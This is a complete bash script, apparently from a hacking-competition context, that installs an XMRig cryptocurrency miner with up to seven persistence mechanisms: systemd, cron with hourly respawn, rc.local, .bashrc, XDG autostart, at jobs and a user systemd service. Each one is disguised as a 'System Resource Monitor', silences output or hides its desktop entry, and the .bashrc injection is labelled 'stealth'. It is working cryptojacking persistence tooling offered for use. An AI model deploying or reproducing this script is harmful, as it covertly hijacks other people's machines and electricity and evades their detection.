#!/bin/bash
################################################################################
# XMRig Persistence Installer
# Purpose: Multiple persistence mechanisms with OPSEC
# Author: OSCP Hackathon 2025
################################################################################

BINARY_PATH="$1"
CONFIG_PATH="$2"

if [ -z "$BINARY_PATH" ] || [ -z "$CONFIG_PATH" ]; then
    echo "Usage: $0 <binary_path> <config_path>"
    exit 1
fi

################################################################################
# Method 1: Systemd Service (Requires Root)
################################################################################
install_systemd() {
    echo "[*] Installing systemd service..."

    if [ "$EUID" -ne 0 ]; then
        echo "[-] Root required for systemd installation"
        return 1
    fi

    SERVICE_NAME=$(basename "$BINARY_PATH")

    cat > "/etc/systemd/system/${SERVICE_NAME}.service" <<EOF
[Unit]
Description=System Resource Monitor
Documentation=man:systemd(1)
After=network.target network-online.target
Wants=network-online.target

[Service]
Type=simple
User=nobody
Group=nogroup
ExecStart=$BINARY_PATH -c $CONFIG_PATH
Restart=always
RestartSec=30
KillMode=process
StandardOutput=null
StandardError=null

# Security settings
PrivateTmp=yes
NoNewPrivileges=true
ProtectSystem=strict
ProtectHome=true
ReadWritePaths=/tmp /var/tmp

[Install]
WantedBy=multi-user.target
EOF

    # Reload and enable
    systemctl daemon-reload
    systemctl enable "${SERVICE_NAME}.service"
    systemctl start "${SERVICE_NAME}.service"

    echo "[+] Systemd service installed: ${SERVICE_NAME}.service"
    echo "    Status: systemctl status ${SERVICE_NAME}.service"
    echo "    Stop: systemctl stop ${SERVICE_NAME}.service"
    echo "    Remove: systemctl disable ${SERVICE_NAME}.service && rm /etc/systemd/system/${SERVICE_NAME}.service"
}

################################################################################
# Method 2: Cron Job (User-level)
################################################################################
install_cron() {
    echo "[*] Installing cron job..."

    # Check if entry already exists
    if crontab -l 2>/dev/null | grep -q "$BINARY_PATH"; then
        echo "[!] Cron entry already exists"
        return 0
    fi

    # Add reboot persistence
    (crontab -l 2>/dev/null; echo "@reboot $BINARY_PATH -c $CONFIG_PATH >/dev/null 2>&1") | crontab -

    # Also add hourly check (ensure it's running)
    (crontab -l 2>/dev/null; echo "0 * * * * pgrep -f $(basename $BINARY_PATH) || $BINARY_PATH -c $CONFIG_PATH >/dev/null 2>&1") | crontab -

    echo "[+] Cron jobs installed"
    echo "    View: crontab -l"
    echo "    Remove: crontab -e (delete lines manually)"
}

################################################################################
# Method 3: RC.local (Legacy Systems)
################################################################################
install_rc_local() {
    echo "[*] Installing rc.local persistence..."

    if [ ! -f "/etc/rc.local" ]; then
        echo "[-] /etc/rc.local not found (modern systemd system)"
        return 1
    fi

    if [ "$EUID" -ne 0 ]; then
        echo "[-] Root required for rc.local modification"
        return 1
    fi

    # Check if already exists
    if grep -q "$BINARY_PATH" /etc/rc.local; then
        echo "[!] Entry already exists in rc.local"
        return 0
    fi

    # Add before 'exit 0'
    sed -i "/^exit 0/i $BINARY_PATH -c $CONFIG_PATH &" /etc/rc.local

    # Ensure executable
    chmod +x /etc/rc.local

    echo "[+] RC.local persistence installed"
    echo "    File: /etc/rc.local"
}

################################################################################
# Method 4: User Profile (.bashrc/.profile)
################################################################################
install_profile() {
    echo "[*] Installing profile persistence..."

    PROFILE_FILE="$HOME/.bashrc"

    # Check if already exists
    if grep -q "$BINARY_PATH" "$PROFILE_FILE"; then
        echo "[!] Entry already exists in profile"
        return 0
    fi

    # Add stealth entry
    cat >> "$PROFILE_FILE" <<EOF

# System resource monitor (auto-start)
if ! pgrep -f $(basename $BINARY_PATH) >/dev/null 2>&1; then
    nohup $BINARY_PATH -c $CONFIG_PATH >/dev/null 2>&1 &
fi
EOF

    echo "[+] Profile persistence installed"
    echo "    File: $PROFILE_FILE"
}

################################################################################
# Method 5: XDG Autostart (Desktop Systems)
################################################################################
install_xdg_autostart() {
    echo "[*] Installing XDG autostart..."

    AUTOSTART_DIR="$HOME/.config/autostart"
    mkdir -p "$AUTOSTART_DIR"

    DESKTOP_FILE="$AUTOSTART_DIR/$(basename $BINARY_PATH).desktop"

    cat > "$DESKTOP_FILE" <<EOF
[Desktop Entry]
Type=Application
Exec=$BINARY_PATH -c $CONFIG_PATH
Hidden=false
NoDisplay=true
X-GNOME-Autostart-enabled=true
Name=System Monitor
Comment=System Resource Monitoring
EOF

    echo "[+] XDG autostart installed"
    echo "    File: $DESKTOP_FILE"
}

################################################################################
# Method 6: At Job (Scheduled Execution)
################################################################################
install_at_job() {
    echo "[*] Installing at job..."

    if ! command -v at &> /dev/null; then
        echo "[-] 'at' command not found"
        return 1
    fi

    # Schedule for 5 minutes from now
    echo "$BINARY_PATH -c $CONFIG_PATH" | at now + 5 minutes 2>&1 | grep -q "job"

    echo "[+] At job scheduled"
    echo "    View: atq"
    echo "    Remove: atrm <job_number>"
}

################################################################################
# Method 7: Systemd User Service (No Root Required)
################################################################################
install_systemd_user() {
    echo "[*] Installing systemd user service..."

    USER_SERVICE_DIR="$HOME/.config/systemd/user"
    mkdir -p "$USER_SERVICE_DIR"

    SERVICE_NAME=$(basename "$BINARY_PATH")
    SERVICE_FILE="$USER_SERVICE_DIR/${SERVICE_NAME}.service"

    cat > "$SERVICE_FILE" <<EOF
[Unit]
Description=User Resource Monitor
After=default.target

[Service]
Type=simple
ExecStart=$BINARY_PATH -c $CONFIG_PATH
Restart=always
RestartSec=30
StandardOutput=null
StandardError=null

[Install]
WantedBy=default.target
EOF

    # Enable user service
    systemctl --user daemon-reload
    systemctl --user enable "${SERVICE_NAME}.service"
    systemctl --user start "${SERVICE_NAME}.service"

    echo "[+] Systemd user service installed"
    echo "    Status: systemctl --user status ${SERVICE_NAME}.service"
    echo "    Stop: systemctl --user stop ${SERVICE_NAME}.service"
}

################################################################################
# Interactive Menu
################################################################################
show_menu() {
    echo "=========================================="
    echo "  XMRig Persistence Installer"
    echo "=========================================="
    echo ""
    echo "Binary: $BINARY_PATH"
    echo "Config: $CONFIG_PATH"
    echo ""
    echo "Select persistence method:"
    echo ""
    echo "  1) Systemd Service (Root - Most Reliable)"
    echo "  2) Cron Job (User - Cross-Platform)"
    echo "  3) RC.local (Root - Legacy Systems)"
    echo "  4) User Profile (.bashrc)"
    echo "  5) XDG Autostart (Desktop Systems)"
    echo "  6) At Job (One-time Scheduled)"
    echo "  7) Systemd User Service (No Root)"
    echo "  8) Install ALL User Methods"
    echo "  9) Install ALL (Root + User)"
    echo "  0) Exit"
    echo ""
    read -p "Choice: " choice

    case $choice in
        1) install_systemd ;;
        2) install_cron ;;
        3) install_rc_local ;;
        4) install_profile ;;
        5) install_xdg_autostart ;;
        6) install_at_job ;;
        7) install_systemd_user ;;
        8)
            echo "[*] Installing all user-level methods..."
            install_cron
            install_profile
            install_xdg_autostart
            install_systemd_user
            ;;
        9)
            echo "[*] Installing all methods (requires root)..."
            install_systemd
            install_rc_local
            install_cron
            install_profile
            install_xdg_autostart
            install_systemd_user
            ;;
        0) echo "Exiting..." ; exit 0 ;;
        *) echo "Invalid choice" ;;
    esac
}

################################################################################
# Main
################################################################################
main() {
    if [ ! -f "$BINARY_PATH" ]; then
        echo "[-] Binary not found: $BINARY_PATH"
        exit 1
    fi

    if [ ! -f "$CONFIG_PATH" ]; then
        echo "[-] Config not found: $CONFIG_PATH"
        exit 1
    fi

    show_menu
}

main
